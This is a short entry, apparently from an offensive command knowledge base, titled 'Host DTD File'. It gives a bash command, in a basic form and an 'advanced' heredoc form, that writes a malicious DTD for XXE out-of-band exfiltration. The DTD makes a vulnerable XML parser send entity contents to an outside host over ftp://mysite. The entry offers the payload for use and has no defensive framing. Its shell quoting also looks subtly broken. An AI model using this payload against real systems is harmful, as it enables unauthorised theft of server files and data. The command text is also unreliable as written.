---
data: >-
  echo '<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM \'ftp://mysite/%b;\'> ">%c;' >
  xx.html
tags:
  - xxe
  - hosting
type: command
executor: bash
platforms:
  - Linux
id: 6837d73e-d072-4b24-a620-2ebdb4a69e2e
created_at: '2025-12-13T09:00:27.895Z'
updated_at: '2025-12-13T09:00:27.895Z'
verified: false
validated: true
submitted: true
---
# Host DTD File

## Command

```bash
echo '<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM \'ftp://mysite/%b;\'> ">%c;' > xx.html
```

## Description

Creates and hosts a DTD file for XXE exfiltration by writing the entity definition to a file, which can then be served via a web server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `> xx.html` | Output file name | Yes |

## Examples

### Basic Usage

```bash
echo '<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM \'ftp://mysite/%b;\'> ">%c;' > xx.html
```

### Advanced Usage

```bash
cat > xx.html <<EOF
<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM \'ftp://mysite/%b;\'> ">%c;
EOF
```

## Expected Output

DTD file created successfully, ready for hosting.

## Related

- [[procedures/Host-External-DTD-for-Exfiltration]]
